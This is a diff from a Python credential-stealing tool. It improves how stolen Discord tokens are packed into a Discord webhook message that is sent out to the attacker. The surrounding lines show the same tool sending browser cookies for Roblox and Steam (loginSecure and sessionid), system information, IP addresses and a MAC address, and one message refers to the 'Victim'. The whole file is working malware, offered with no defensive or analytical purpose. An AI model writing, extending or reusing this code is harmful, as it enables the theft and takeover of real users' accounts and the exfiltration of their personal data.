@@ -776,7 +776,7 @@ robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloope
 sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4}```\n```IPv6: {ip6()}```\n```Proccessor: {info["Processor"]}```\n```Ram: {info["RAM"]}```\n```Machine: {info["Machine"]}```\n```Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
 steamloginembed = DiscordEmbed(title='steamLoginSecure Cookies',description=f'Opera:```{opera_steam_cookie}```\nChrome:```{chrome_steam_cookie}```\nEdge:```{edge_steam_cookie}```\nFirefox:```{firefox_steam_cookie}```',color='4e6cd9')
 steamsesembed = DiscordEmbed(title='Steam sessionid cookies',description=f'Opera:```{opera_session_cookie}```\nChrome:```{chrome_session_cookie}```\nEdge:```{edge_session_cookie}```\nFirefox:```{firefox_session_cookie}```',color='4e6cd9')
-discordtokenembed= DiscordEmbed(title='Discord Token',description=f'Token:\n```{Discordtokens()}```')
+discordtokenembed= DiscordEmbed(title='Discord Token(s)',description='# Tokens:\n')
 discordtokeninfoembed= DiscordEmbed()
 
 
@@ -790,7 +790,20 @@ try:
 except PermissionError as e:
     errorembed = DiscordEmbed(title='Permission error to access the browserfiles',description='```Victim needs computer shutdown for restrictions to be lifted```')
     webhook.add_embed(errorembed)   
-    
+
+tokenamt=0 
+tokenlistamt=len(Discordtokens())   
+for token in Discordtokens():
+    tokenamt += 1
+    field_name = f'**Token {tokenamt}**'  # Create a field name based on the token count
+    field_value = f'```{token}```'  # Use the token as the field value
+    discordtokenembed.add_embed_field(name=field_name, value=field_value)
+    print(f'added token{tokenamt}')
+
+    # Check if you've added all available tokens and break the loop if needed
+    if tokenamt == tokenlistamt:
+        break
+
 webhook.add_embed(sysembed) 
 webhook.add_embed(wifiembed)
 webhook.add_embed(geolocationembed)
